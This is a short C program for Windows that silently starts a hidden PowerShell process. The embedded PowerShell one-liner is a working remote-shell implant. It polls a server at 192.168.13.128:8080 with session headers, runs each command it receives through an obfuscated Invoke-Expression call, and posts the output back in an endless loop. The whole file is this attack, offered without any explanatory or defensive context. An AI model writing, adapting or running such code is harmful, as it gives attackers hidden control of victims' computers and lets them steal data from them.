#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void openConnection() {
    const char* command = "powershell.exe -Command \"$s='192.168.13.128:8080';$i='435693df-fe69567a-a0ccab9f';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/435693df -Headers @{\\\"X-bd3b-7843\\\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/fe69567a -Headers @{\\\"X-bd3b-7843\\\"=$i}).Content;if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/a0ccab9f -Method POST -Headers @{\\\"X-bd3b-7843\\\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\"";
    // Initialize the startup info structure
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Hide the window by setting the flag
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // This hides the window
    
    // Create the process
    if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int main (void) {
    openConnection();
    return 0;
}